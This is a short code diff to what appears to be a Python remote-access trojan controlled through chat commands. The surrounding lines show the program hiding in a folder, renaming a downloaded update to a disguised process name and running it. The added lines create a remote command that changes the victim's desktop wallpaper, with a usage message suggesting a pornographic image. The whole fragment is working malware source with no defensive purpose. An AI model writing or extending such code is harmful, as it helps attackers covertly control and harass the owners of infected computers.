@@ -495,6 +495,15 @@ def handle(msg):
 					os.rename(hide_folder + '\\updated.exe', hide_folder + '\\' + proc_name)
 					os.system(hide_folder + '\\' + proc_name)
 					sys.exit()
+			elif command.startswith('/wallpaper'):
+				command = command.replace('/wallpaper', '')
+				command = command.strip()
+				if len(command) == 0:
+					response = 'Usage: /wallpaper C:/Users/User/Desktop/porn.jpg'
+				else:
+					print command
+					ctypes.windll.user32.SystemParametersInfoW(20, 0, command.replace('/', '//'), 3)
+					response = 'Wallpaper succesfully set.'
 			elif command == '/help':
 				# functionalities dictionary: command:arguments
 				functionalities = { '/arp' : '', \
